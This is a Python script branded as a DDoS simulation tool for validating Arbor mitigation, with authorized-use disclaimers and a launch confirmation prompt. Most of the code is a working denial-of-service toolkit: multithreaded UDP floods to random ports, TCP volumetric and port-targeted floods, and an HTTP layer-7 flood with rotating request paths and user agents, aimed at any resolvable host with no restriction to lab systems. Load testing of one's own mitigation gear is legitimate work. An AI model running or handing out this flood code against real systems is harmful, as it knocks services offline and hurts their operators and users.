#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════════════════════════╗
║          CONVERSYS IT SOLUTIONS - Network Stress Testing Platform               ║
║                    DDoS Simulation & Validation Tool v2.0                       ║
║              For use with Netscout Arbor DDoS Protection Testing                ║
║                     © 2026 Conversys IT Solutions                               ║
║        AUTHORIZED USE ONLY - Penetration Testing & Lab Environments             ║
╚══════════════════════════════════════════════════════════════════════════════════╝

DISCLAIMER: This tool is intended solely for authorized network security testing,
penetration testing in controlled lab environments, and validation of DDoS
mitigation solutions such as Netscout Arbor. Unauthorized use against systems
without explicit written permission is illegal and unethical.
"""

import socket
import threading
import time
import random
import sys
import os
import struct
import select
import subprocess
import signal
from datetime import datetime

# ─── Dependency check and install ────────────────────────────────────────────
def install_dependencies():
    packages = ["psutil", "scapy"]
    for pkg in packages:
        try:
            __import__(pkg)
        except ImportError:
            print(f"[*] Installing {pkg}...")
            subprocess.run([sys.executable, "-m", "pip", "install", pkg, "-q"],
                           check=False)

install_dependencies()

import psutil

# ─── ANSI Color Palette ───────────────────────────────────────────────────────
class C:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"

    # Brand colors
    CYAN    = "\033[96m"
    BLUE    = "\033[94m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    RED     = "\033[91m"
    MAGENTA = "\033[95m"
    WHITE   = "\033[97m"
    GRAY    = "\033[90m"

    # Backgrounds
    BG_BLUE  = "\033[44m"
    BG_RED   = "\033[41m"
    BG_BLACK = "\033[40m"
    BG_CYAN  = "\033[46m"

# ─── Utility helpers ──────────────────────────────────────────────────────────
def clear():
    os.system("clear")

def hr(char="═", width=84, color=C.CYAN):
    print(f"{color}{char * width}{C.RESET}")

def center(text, width=84):
    return text.center(width)

def fmt_bytes(n):
    if n < 1024:
        return f"{n:.1f} B"
    elif n < 1024**2:
        return f"{n/1024:.2f} KB"
    elif n < 1024**3:
        return f"{n/1024**2:.2f} MB"
    else:
        return f"{n/1024**3:.3f} GB"

def fmt_rate(bps):
    if bps < 1024:
        return f"{bps:.1f} bps"
    elif bps < 1024**2:
        return f"{bps/1024:.2f} Kbps"
    elif bps < 1024**3:
        return f"{bps/1024**2:.2f} Mbps"
    else:
        return f"{bps/1024**3:.3f} Gbps"

def get_net_iface():
    """Pick the first active non-loopback interface."""
    stats = psutil.net_if_stats()
    for iface, st in stats.items():
        if iface != "lo" and st.isup:
            return iface
    return "eth0"

def progress_bar(pct, width=30, color=C.GREEN):
    filled = int(width * pct / 100)
    bar = "█" * filled + "░" * (width - filled)
    return f"{color}{bar}{C.RESET}"

def random_ip():
    return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def random_payload(size):
    return random.randbytes(size)

# ─── Shared attack state ──────────────────────────────────────────────────────
class AttackState:
    def __init__(self):
        self.running       = False
        self.bytes_sent    = 0
        self.packets_sent  = 0
        self.errors        = 0
        self.threads_alive = 0
        self.pps_history   = []   # packets-per-second samples
        self.bps_history   = []   # bytes-per-second samples
        self.start_time    = None
        self._lock         = threading.Lock()

    def add(self, nbytes):
        with self._lock:
            self.bytes_sent   += nbytes
            self.packets_sent += 1

    def add_error(self):
        with self._lock:
            self.errors += 1

    def elapsed(self):
        if self.start_time is None:
            return 0
        return time.time() - self.start_time

state = AttackState()

# ─── BANNER ───────────────────────────────────────────────────────────────────
def print_banner():
    clear()
    print()
    hr("═")
    print(f"{C.CYAN}{C.BOLD}")
    print(center("  ██████╗ ██████╗ ███╗  ██╗██╗   ██╗███████╗██████╗ ███████╗██╗   ██╗███████╗  "))
    print(center(" ██╔════╝██╔═══██╗████╗ ██║██║   ██║██╔════╝██╔══██╗██╔════╝╚██╗ ██╔╝██╔════╝  "))
    print(center(" ██║     ██║   ██║██╔██╗██║╚██╗ ██╔╝█████╗  ██████╔╝███████╗ ╚████╔╝ ███████╗  "))
    print(center(" ██║     ██║   ██║██║╚████║ ╚████╔╝ ██╔══╝  ██╔══██╗╚════██║  ╚██╔╝  ╚════██║  "))
    print(center(" ╚██████╗╚██████╔╝██║ ╚███║  ╚██╔╝  ███████╗██║  ██║███████║   ██║   ███████║  "))
    print(center("  ╚═════╝ ╚═════╝ ╚═╝  ╚══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝  "))
    print(C.RESET)
    hr("─", color=C.BLUE)
    print(f"{C.WHITE}{C.BOLD}{center('Network Stress Testing Platform  ·  DDoS Simulation & Arbor Validation')}{C.RESET}")
    print(f"{C.GRAY}{center('© 2026 Conversys IT Solutions  |  AUTHORIZED PENETRATION TESTING USE ONLY')}{C.RESET}")
    hr("═")
    print()

# ─── DASHBOARD ────────────────────────────────────────────────────────────────
def dashboard(attack_label, target, extra_info=""):
    """Real-time metrics panel. Runs in its own thread."""
    iface          = get_net_iface()
    prev_bytes_s   = state.bytes_sent
    prev_net       = psutil.net_io_counters(pernic=True).get(iface, psutil.net_io_counters())
    prev_time      = time.time()
    prev_pkts      = state.packets_sent

    while state.running:
        # Sleep in small slices so the thread notices state.running=False quickly
        for _ in range(10):
            if not state.running:
                return
            time.sleep(0.1)
        if not state.running:
            return
        now        = time.time()
        dt         = now - prev_time
        prev_time  = now

        # ── Tool-level TX rate ──
        cur_bytes  = state.bytes_sent
        tx_rate    = (cur_bytes - prev_bytes_s) / dt if dt > 0 else 0
        prev_bytes_s = cur_bytes

        # ── Interface outbound rate ──
        net_now    = psutil.net_io_counters(pernic=True).get(iface)
        if net_now:
            iface_tx = (net_now.bytes_sent - prev_net.bytes_sent) / dt if dt > 0 else 0
            iface_pkt = (net_now.packets_sent - prev_net.packets_sent) / dt if dt > 0 else 0
            prev_net  = net_now
        else:
            iface_tx = iface_pkt = 0

        # ── PPS ──
        cur_pkts = state.packets_sent
        pps      = (cur_pkts - prev_pkts) / dt if dt > 0 else 0
        prev_pkts = cur_pkts

        state.pps_history.append(pps)
        state.bps_history.append(tx_rate * 8)
        if len(state.pps_history) > 60:
            state.pps_history.pop(0)
        if len(state.bps_history) > 60:
            state.bps_history.pop(0)

        avg_bps    = sum(state.bps_history) / len(state.bps_history) if state.bps_history else 0
        peak_bps   = max(state.bps_history) if state.bps_history else 0
        elapsed    = state.elapsed()

        # ── CPU / MEM ──
        cpu_pct    = psutil.cpu_percent()
        mem_pct    = psutil.virtual_memory().percent

        # ── Bandwidth % estimate (assume 1 Gbps link) ──
        link_cap   = 1_000_000_000  # 1 Gbps
        bw_pct     = min(iface_tx * 8 / link_cap * 100, 100)

        # ── Draw dashboard ──
        clear()
        print_banner()

        # Header row
        now_str = datetime.now().strftime("%Y-%m-%d  %H:%M:%S")
        print(f"  {C.BOLD}{C.WHITE}Attack Type : {C.CYAN}{attack_label:<25}{C.RESET}  "
              f"{C.BOLD}{C.WHITE}Target : {C.RED}{target}{C.RESET}")
        if extra_info:
            print(f"  {C.GRAY}{extra_info}{C.RESET}")
        print(f"  {C.GRAY}Interface   : {iface:<15}  Timestamp : {now_str}{C.RESET}")
        hr("─", color=C.BLUE)

        # ── Metric cards ──────────────────────────────────────────────────────
        def metric(label, value, unit="", color=C.GREEN):
            return (f"  {C.BOLD}{C.WHITE}{label:<28}{C.RESET}"
                    f"{color}{C.BOLD}{value:<18}{C.RESET}{C.GRAY}{unit}{C.RESET}")

        print()
        print(f"  {C.BOLD}{C.YELLOW}{'═'*36}  LIVE METRICS  {'═'*29}{C.RESET}")
        print()

        # 1. Total data sent
        print(metric("📦  Total Data Sent",
                     fmt_bytes(state.bytes_sent), "", C.CYAN))

        # 2. TX rate (tool-level)
        print(metric("🚀  TX Rate (tool-level)",
                     fmt_rate(tx_rate * 8), "outbound", C.GREEN))

        # 3. Outbound interface bandwidth
        print(metric("🌐  Interface Outbound BW",
                     fmt_rate(iface_tx * 8), f"on {iface}", C.YELLOW))

        # 4. BW utilization bar
        bw_bar = progress_bar(bw_pct, width=28,
                               color=C.RED if bw_pct > 70 else C.YELLOW if bw_pct > 40 else C.GREEN)
        print(f"  {C.BOLD}{C.WHITE}{'📊  BW Utilization (1G link)':<28}{C.RESET}"
              f"{bw_bar}  {C.CYAN}{bw_pct:.1f}%{C.RESET}")

        # 5. Packets per second
        print(metric("⚡  Packets Per Second (PPS)",
                     f"{pps:,.0f}", "pkt/s", C.MAGENTA))

        # 6. Interface PPS
        print(metric("📡  Interface PPS (outbound)",
                     f"{iface_pkt:,.0f}", "pkt/s", C.BLUE))

        # 7. Peak bandwidth
        print(metric("🏆  Peak Bandwidth (session)",
                     fmt_rate(peak_bps), "", C.RED))

        # 8. Average bandwidth
        print(metric("📈  Avg Bandwidth (60s)",
                     fmt_rate(avg_bps), "", C.GREEN))

        # 9. Total packets
        print(metric("🔢  Total Packets Sent",
                     f"{state.packets_sent:,}", "packets", C.CYAN))

        # 10. Errors / dropped
        err_color = C.RED if state.errors > 0 else C.GREEN
        print(metric("⚠️   Send Errors / Drops",
                     f"{state.errors:,}", "", err_color))

        # 11. Elapsed time
        mm, ss = divmod(int(elapsed), 60)
        hh, mm = divmod(mm, 60)
        print(metric("⏱️   Elapsed Time",
                     f"{hh:02d}:{mm:02d}:{ss:02d}", "", C.WHITE))

        # 12. CPU / Memory
        cpu_bar = progress_bar(cpu_pct, width=14,
                                color=C.RED if cpu_pct > 80 else C.YELLOW)
        mem_bar = progress_bar(mem_pct, width=14,
                                color=C.RED if mem_pct > 80 else C.YELLOW)
        print(f"  {C.BOLD}{C.WHITE}{'🖥️   CPU / Memory':<28}{C.RESET}"
              f"{cpu_bar} {C.WHITE}{cpu_pct:5.1f}%{C.RESET}  "
              f"{mem_bar} {C.WHITE}{mem_pct:5.1f}%{C.RESET}")

        # 13. Active threads
        alive = threading.active_count() - 2  # exclude dashboard + main
        print(metric("🔧  Active Attack Threads",
                     f"{alive}", "threads", C.MAGENTA))

        print()
        hr("─", color=C.BLUE)
        print(f"  {C.RED}{C.BOLD}[ Press CTRL+C to stop the attack and return to menu ]{C.RESET}")
        print()

# ─── ATTACK MODULES ───────────────────────────────────────────────────────────

# ── 1. Volumetric — UDP / TCP / Mixed ────────────────────────────────────────

def _udp_flood_worker(target_ip, target_port, payload_size):
    """Pure UDP volumetric worker — stateless, maximum raw throughput."""
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)
        while state.running:
            data = random_payload(payload_size)
            try:
                sock.sendto(data, (target_ip, target_port))
                state.add(len(data))
            except BlockingIOError:
                pass
            except Exception:
                state.add_error()
    except Exception:
        state.add_error()
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass


def _tcp_volumetric_worker(target_ip, target_port, payload_size):
    """
    TCP volumetric worker — connects and blasts large raw payloads to keep
    the TCP session pipe full, simulating bandwidth-saturation on HTTPS/443
    or any TCP service without caring about protocol semantics.
    """
    while state.running:
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.settimeout(2)
            sock.connect((target_ip, target_port))
            # Once connected, blast as fast as possible until disconnected
            data = random_payload(payload_size)
            while state.running:
                try:
                    sock.sendall(data)
                    state.add(len(data))
                    data = random_payload(payload_size)   # rotate payload
                except (BrokenPipeError, ConnectionResetError, OSError):
                    break
        except Exception:
            state.add_error()
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass


def attack_volumetric(target_ip, proto, target_port, threads, payload_size):
    """
    Launch a volumetric flood.
    proto  : 'udp' | 'tcp' | 'mixed'
    For UDP  → random destination ports (true volumetric saturation).
    For TCP  → all threads hammer target_port (e.g. 443 for HTTPS stress).
    For Mixed → 60 % TCP threads + 40 % UDP threads simultaneously.
    """
    proto_label = proto.upper()
    if proto == "mixed":
        proto_label = "TCP+UDP Mixed"

    extra = (f"{proto_label} Volumetric  |  Port: {target_port}  |  "
             f"Payload: {payload_size} B  |  Threads: {threads}")

    tcp_count = 0
    udp_count = 0

    for i in range(threads):
        if proto == "udp":
            t = threading.Thread(
                target=_udp_flood_worker,
                args=(target_ip, random.randint(1, 65535), payload_size),
                daemon=True)
            udp_count += 1
        elif proto == "tcp":
            t = threading.Thread(
                target=_tcp_volumetric_worker,
                args=(target_ip, target_port, payload_size),
                daemon=True)
            tcp_count += 1
        else:  # mixed — 60 % TCP, 40 % UDP
            if i < int(threads * 0.6):
                t = threading.Thread(
                    target=_tcp_volumetric_worker,
                    args=(target_ip, target_port, payload_size),
                    daemon=True)
                tcp_count += 1
            else:
                t = threading.Thread(
                    target=_udp_flood_worker,
                    args=(target_ip, random.randint(1, 65535), payload_size),
                    daemon=True)
                udp_count += 1
        t.start()

    if proto == "mixed":
        extra += f"  |  TCP: {tcp_count}  UDP: {udp_count}"

    dash_label = f"Volumetric {proto_label} Flood"
    dash = threading.Thread(target=dashboard,
                            args=(dash_label, target_ip, extra),
                            daemon=True)
    dash.start()

    try:
        while state.running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        pass
    finally:
        state.running = False
        time.sleep(0.3)
        print(f"\n{C.YELLOW}[!] Attack stopped — returning to menu.{C.RESET}")


# ── 2. Port-targeted TCP SYN / ACK flood ─────────────────────────────────────
def _tcp_flood_worker(target_ip, target_port):
    while state.running:
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            # Send raw data after connect (simulate heavy HTTP GET)
            payload = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {target_ip}\r\n"
                f"User-Agent: {random_ip()}\r\n"
                f"Connection: keep-alive\r\n\r\n"
            ).encode()
            sock.connect((target_ip, target_port))
            for _ in range(5):
                if not state.running:
                    break
                sock.sendall(payload)
                state.add(len(payload))
        except Exception:
            state.add_error()
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass


def _udp_port_worker(target_ip, target_port, payload_size):
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)
        while state.running:
            data = random_payload(payload_size)
            try:
                sock.sendto(data, (target_ip, target_port))
                state.add(len(data))
            except BlockingIOError:
                pass
            except Exception:
                state.add_error()
    except Exception:
        state.add_error()
    finally:
        if sock:
            sock.close()


def attack_port(target_ip, target_port, protocol="tcp", threads=150):
    proto_label = protocol.upper()
    extra = (f"{proto_label} Flood  |  Port: {target_port}  |  "
             f"Threads: {threads}")

    workers = []
    for _ in range(threads):
        if protocol == "tcp":
            t = threading.Thread(target=_tcp_flood_worker,
                                 args=(target_ip, target_port), daemon=True)
        else:
            t = threading.Thread(target=_udp_port_worker,
                                 args=(target_ip, target_port, 1200), daemon=True)
        t.start()
        workers.append(t)

    dash = threading.Thread(target=dashboard,
                            args=(f"Port-Targeted {proto_label} Flood",
                                  f"{target_ip}:{target_port}", extra),
                            daemon=True)
    dash.start()

    try:
        while state.running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        pass
    finally:
        state.running = False
        time.sleep(0.3)
        print(f"\n{C.YELLOW}[!] Attack stopped — returning to menu.{C.RESET}")


# ── 3. Application-layer HTTP flood ──────────────────────────────────────────
HTTP_METHODS = ["GET", "POST", "HEAD", "OPTIONS"]
HTTP_PATHS   = ["/", "/index.html", "/login", "/api/v1/status",
                "/search?q=" + "A"*64, "/wp-admin", "/.env",
                "/static/main.js", "/graphql", "/api/users"]
HTTP_UAS     = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "curl/7.88.1",
    "Python-urllib/3.11",
    "Go-http-client/2.0",
    "Wget/1.21.3 (linux-gnu)",
]

def _http_flood_worker(target_ip, target_port, use_https=False):
    while state.running:
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, target_port))
            method = random.choice(HTTP_METHODS)
            path   = random.choice(HTTP_PATHS)
            ua     = random.choice(HTTP_UAS)
            body   = random_payload(random.randint(0, 512)) if method == "POST" else b""
            req = (
                f"{method} {path} HTTP/1.1\r\n"
                f"Host: {target_ip}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Accept: */*\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Connection: close\r\n\r\n"
            ).encode() + body
            sock.sendall(req)
            state.add(len(req))
        except Exception:
            state.add_error()
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass


def attack_application(target_ip, target_port, app_type, threads=120):
    extra = (f"HTTP App Flood  |  App: {app_type}  |  "
             f"Port: {target_port}  |  Threads: {threads}")

    workers = []
    for _ in range(threads):
        t = threading.Thread(target=_http_flood_worker,
                             args=(target_ip, target_port), daemon=True)
        t.start()
        workers.append(t)

    dash = threading.Thread(target=dashboard,
                            args=(f"Application Layer Flood [{app_type}]",
                                  f"{target_ip}:{target_port}", extra),
                            daemon=True)
    dash.start()

    try:
        while state.running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        pass
    finally:
        state.running = False
        time.sleep(0.3)
        print(f"\n{C.YELLOW}[!] Attack stopped — returning to menu.{C.RESET}")


# ─── INPUT HELPERS ────────────────────────────────────────────────────────────
def ask(prompt, default=None):
    d = f" [{default}]" if default is not None else ""
    val = input(f"  {C.BOLD}{C.WHITE}{prompt}{d}: {C.CYAN}").strip()
    print(C.RESET, end="")
    return val if val else str(default) if default is not None else ""

def validate_ip_host(value):
    """Accept IP or hostname, return resolved IP."""
    try:
        ip = socket.gethostbyname(value)
        return ip
    except Exception:
        return None

def validate_port(value):
    try:
        p = int(value)
        if 1 <= p <= 65535:
            return p
    except Exception:
        pass
    return None

def validate_int(value, lo, hi):
    try:
        v = int(value)
        if lo <= v <= hi:
            return v
    except Exception:
        pass
    return None

# ─── MENUS ────────────────────────────────────────────────────────────────────
def section_header(title):
    print()
    hr("─", color=C.BLUE)
    print(f"  {C.BOLD}{C.CYAN}▶  {title}{C.RESET}")
    hr("─", color=C.BLUE)
    print()

def target_menu():
    print_banner()
    section_header("STEP 1  ·  Define Target")

    while True:
        raw = ask("Target IP or Hostname (e.g. 192.168.1.10 or victim.lab)")
        if not raw:
            print(f"  {C.RED}[!] Target cannot be empty.{C.RESET}")
            continue
        ip = validate_ip_host(raw)
        if ip is None:
            print(f"  {C.RED}[!] Could not resolve '{raw}'. Try again.{C.RESET}")
            continue
        if ip != raw:
            print(f"  {C.GREEN}[✓] Resolved: {raw}  →  {ip}{C.RESET}")
        else:
            print(f"  {C.GREEN}[✓] Target accepted: {ip}{C.RESET}")
        return raw, ip

def attack_type_menu(target_raw, target_ip):
    print_banner()
    section_header("STEP 2  ·  Select Attack Type")

    print(f"  {C.WHITE}Target   : {C.RED}{C.BOLD}{target_raw}{C.RESET}"
          f"  {C.GRAY}({target_ip}){C.RESET}")
    print()
    print(f"  {C.BOLD}{C.CYAN}  1{C.RESET}{C.WHITE}  ›  Volumetric Attack    {C.GRAY}(UDP / TCP / Mixed — bandwidth saturation){C.RESET}")
    print(f"  {C.BOLD}{C.CYAN}  2{C.RESET}{C.WHITE}  ›  Port-Targeted Attack {C.GRAY}(TCP/UDP flood to a specific port){C.RESET}")
    print(f"  {C.BOLD}{C.CYAN}  3{C.RESET}{C.WHITE}  ›  Application Attack   {C.GRAY}(HTTP layer-7 flood against a web app){C.RESET}")
    print(f"  {C.BOLD}{C.GRAY}  0{C.RESET}{C.GRAY}  ›  Change Target{C.RESET}")
    print(f"  {C.BOLD}{C.RED}  9{C.RESET}{C.RED}  ›  Exit Application{C.RESET}")
    print()

    while True:
        choice = ask("Select attack type")
        if choice in ("1", "2", "3", "0", "9"):
            return choice
        print(f"  {C.RED}[!] Invalid selection.{C.RESET}")

def volumetric_config():
    section_header("Volumetric Attack Configuration")
    print(f"  {C.GRAY}High-rate flood designed to saturate bandwidth and exhaust server resources.{C.RESET}")
    print()

    # ── Protocol selection ──
    print(f"  {C.BOLD}{C.WHITE}Protocol / Mode:{C.RESET}")
    print(f"    {C.CYAN}1{C.RESET}  {C.WHITE}UDP Only   {C.GRAY}— Stateless, random ports, maximum raw throughput (classic volumetric){C.RESET}")
    print(f"    {C.CYAN}2{C.RESET}  {C.WHITE}TCP Only   {C.GRAY}— Connects and saturates a specific port (e.g. 443 HTTPS, 80 HTTP){C.RESET}")
    print(f"    {C.CYAN}3{C.RESET}  {C.WHITE}Mixed      {C.GRAY}— 60%% TCP + 40%% UDP simultaneously (hardest to mitigate){C.RESET}")
    print()
    while True:
        pc = ask("Select protocol mode", "1")
        if pc == "1":
            proto = "udp"; break
        elif pc == "2":
            proto = "tcp"; break
        elif pc == "3":
            proto = "mixed"; break
        print(f"  {C.RED}[!] Invalid selection.{C.RESET}")

    # ── Target port (for TCP / Mixed) ──
    if proto == "udp":
        target_port = 0   # random per-packet, shown as "random" in dashboard
        print(f"  {C.GRAY}[i] UDP mode: destination port will be randomized per packet.{C.RESET}")
    else:
        print()
        print(f"  {C.BOLD}{C.WHITE}Common targets:{C.RESET}")
        print(f"  {C.GRAY}   80  = HTTP    443 = HTTPS    8080 = Alt-HTTP    25 = SMTP    53 = DNS{C.RESET}")
        while True:
            p_raw = ask("Target port (1-65535)", 443)
            target_port = validate_port(str(p_raw))
            if target_port:
                break
            print(f"  {C.RED}[!] Invalid port.{C.RESET}")

    # ── Threads ──
    print()
    t_raw   = ask("Number of threads (10-500)", 200)
    threads = validate_int(t_raw, 10, 500) or 200

    # ── Payload size ──
    p_raw   = ask("Payload size in bytes (64-65000)", 1400)
    payload = validate_int(p_raw, 64, 65000) or 1400

    print()
    port_str = "random" if proto == "udp" else str(target_port)
    print(f"  {C.GREEN}[✓] Proto: {proto.upper():<8} Port: {port_str:<8} "
          f"Threads: {threads:<6} Payload: {payload} B{C.RESET}")
    return proto, target_port, threads, payload

def port_config():
    section_header("Port-Targeted Attack Configuration")
    print(f"  {C.GRAY}Floods a specific TCP or UDP port with high-rate packets.{C.RESET}")
    print()

    while True:
        p_raw = ask("Target port (1-65535)")
        port  = validate_port(p_raw)
        if port:
            break
        print(f"  {C.RED}[!] Invalid port.{C.RESET}")

    print(f"  {C.BOLD}{C.WHITE}Protocol :{C.RESET}")
    print(f"    {C.CYAN}1{C.RESET}  TCP")
    print(f"    {C.CYAN}2{C.RESET}  UDP")
    while True:
        pc = ask("Choose protocol", "1")
        if pc == "1":
            proto = "tcp"; break
        elif pc == "2":
            proto = "udp"; break

    t_raw   = ask("Number of threads (10-400)", 150)
    threads = validate_int(t_raw, 10, 400) or 150

    print()
    print(f"  {C.GREEN}[✓] Port : {port}  Protocol : {proto.upper()}  Threads : {threads}{C.RESET}")
    return port, proto, threads

APP_TYPES = {
    "1": ("HTTP Web Server",      80),
    "2": ("HTTPS Web Server",     443),
    "3": ("Apache / Nginx",       80),
    "4": ("API Gateway",          8080),
    "5": ("Custom port",          None),
}

def app_config():
    section_header("Application-Layer Attack Configuration")
    print(f"  {C.GRAY}Layer-7 HTTP flood simulating realistic browser/API requests.{C.RESET}")
    print()

    for k, (name, port) in APP_TYPES.items():
        pstr = f":{port}" if port else ":custom"
        print(f"  {C.CYAN}{k}{C.RESET}  {name:<25} {C.GRAY}{pstr}{C.RESET}")
    print()

    while True:
        ac = ask("Select application type", "1")
        if ac in APP_TYPES:
            break
        print(f"  {C.RED}[!] Invalid choice.{C.RESET}")

    app_name, default_port = APP_TYPES[ac]

    if default_port is None:
        while True:
            p_raw = ask("Custom port (1-65535)")
            port  = validate_port(p_raw)
            if port:
                break
            print(f"  {C.RED}[!] Invalid port.{C.RESET}")
    else:
        p_raw = ask(f"Target port", default_port)
        port  = validate_port(p_raw) or default_port

    t_raw   = ask("Number of threads (10-300)", 120)
    threads = validate_int(t_raw, 10, 300) or 120

    print()
    print(f"  {C.GREEN}[✓] App : {app_name}  Port : {port}  Threads : {threads}{C.RESET}")
    return app_name, port, threads

def confirm_launch(attack_label, target, details):
    print()
    hr("─", color=C.RED)
    print(f"  {C.BOLD}{C.RED}⚠   ATTACK LAUNCH CONFIRMATION{C.RESET}")
    hr("─", color=C.RED)
    print()
    print(f"  {C.WHITE}Attack      : {C.YELLOW}{attack_label}{C.RESET}")
    print(f"  {C.WHITE}Target      : {C.RED}{C.BOLD}{target}{C.RESET}")
    print(f"  {C.WHITE}Details     : {C.GRAY}{details}{C.RESET}")
    print()
    print(f"  {C.BOLD}{C.YELLOW}You are about to generate significant network traffic towards the target.{C.RESET}")
    print(f"  {C.GRAY}Ensure you have explicit written authorization before proceeding.{C.RESET}")
    print()
    confirm = ask("Type 'LAUNCH' to start or 'CANCEL' to abort").upper()
    return confirm == "LAUNCH"

def summary_report():
    """Show a final summary after the attack stops."""
    clear()
    print_banner()
    section_header("ATTACK SESSION SUMMARY  ·  Conversys IT Solutions")

    elapsed = state.elapsed()
    mm, ss  = divmod(int(elapsed), 60)
    hh, mm  = divmod(mm, 60)

    avg_bps  = sum(state.bps_history) / len(state.bps_history)  if state.bps_history else 0
    peak_bps = max(state.bps_history)                            if state.bps_history else 0
    avg_pps  = sum(state.pps_history) / len(state.pps_history)  if state.pps_history else 0

    rows = [
        ("Total Data Sent",          fmt_bytes(state.bytes_sent)),
        ("Total Packets Sent",        f"{state.packets_sent:,}"),
        ("Total Errors / Drops",      f"{state.errors:,}"),
        ("Elapsed Time",              f"{hh:02d}:{mm:02d}:{ss:02d}"),
        ("Average TX Bandwidth",      fmt_rate(avg_bps)),
        ("Peak TX Bandwidth",         fmt_rate(peak_bps)),
        ("Average PPS",               f"{avg_pps:,.0f} pkt/s"),
        ("Session Timestamp",         datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
        ("Tested by",                 "Conversys IT Solutions"),
    ]

    for label, value in rows:
        print(f"  {C.BOLD}{C.WHITE}{label:<30}{C.RESET}{C.CYAN}{value}{C.RESET}")

    print()
    hr("═")
    print()

# ─── MAIN FLOW ────────────────────────────────────────────────────────────────
def reset_state():
    global state
    state = AttackState()
    state.running    = True
    state.start_time = time.time()

def main():
    # SIGINT is handled per-attack via _stop_event; restore default so the
    # interactive menus can still be interrupted cleanly if needed.
    signal.signal(signal.SIGINT, signal.default_int_handler)

    if os.geteuid() != 0:
        print(f"{C.YELLOW}[!] Some features work best with root (e.g. raw sockets).{C.RESET}")

    while True:
        # Step 1: Target
        target_raw, target_ip = target_menu()

        # Step 2: Attack type
        choice = attack_type_menu(target_raw, target_ip)

        if choice == "9":
            # ── Exit ──
            clear()
            print_banner()
            hr("─", color=C.BLUE)
            print(f"  {C.BOLD}{C.GREEN}  Thank you for using the Conversys IT Solutions Testing Platform.{C.RESET}")
            print(f"  {C.GRAY}  All attack threads have been stopped. Session terminated cleanly.{C.RESET}")
            print()
            print(f"  {C.CYAN}  © 2026 Conversys IT Solutions  |  Network Stress Testing Platform v2.0{C.RESET}")
            hr("─", color=C.BLUE)
            print()
            sys.exit(0)

        elif choice == "0":
            continue  # restart

        elif choice == "1":
            # ── Volumetric ──
            proto, target_port, threads, payload = volumetric_config()
            port_str  = "random" if proto == "udp" else str(target_port)
            proto_lbl = "TCP+UDP Mixed" if proto == "mixed" else proto.upper()
            details   = f"{proto_lbl} Volumetric | Port: {port_str} | {threads} threads | {payload}B payload"
            if not confirm_launch(f"Volumetric {proto_lbl} Flood", target_raw, details):
                continue
            reset_state()
            attack_volumetric(target_ip, proto, target_port, threads, payload)
            summary_report()

        elif choice == "2":
            # ── Port ──
            port, proto, threads = port_config()
            details = f"{proto.upper()} Flood | Port {port} | {threads} threads"
            if not confirm_launch(f"Port-Targeted {proto.upper()} Flood",
                                  f"{target_raw}:{port}", details):
                continue
            reset_state()
            attack_port(target_ip, port, proto, threads)
            summary_report()

        elif choice == "3":
            # ── Application ──
            app_name, port, threads = app_config()
            details = f"HTTP Flood | {app_name} | Port {port} | {threads} threads"
            if not confirm_launch(f"Application Layer Flood [{app_name}]",
                                  f"{target_raw}:{port}", details):
                continue
            reset_state()
            attack_application(target_ip, port, app_name, threads)
            summary_report()

        # After summary, ask to run again
        again = ask("\nRun another test? (y/n)", "y").lower()
        if again != "y":
            break

    print_banner()
    print(f"  {C.BOLD}{C.GREEN}  Thank you for using the Conversys IT Solutions Testing Platform.{C.RESET}")
    print(f"  {C.GRAY}  All attack threads have been stopped. Session terminated cleanly.{C.RESET}")
    print()
    print(f"  {C.CYAN}  © 2026 Conversys IT Solutions  |  Network Stress Testing Platform v2.0{C.RESET}")
    print()

if __name__ == "__main__":
    main()
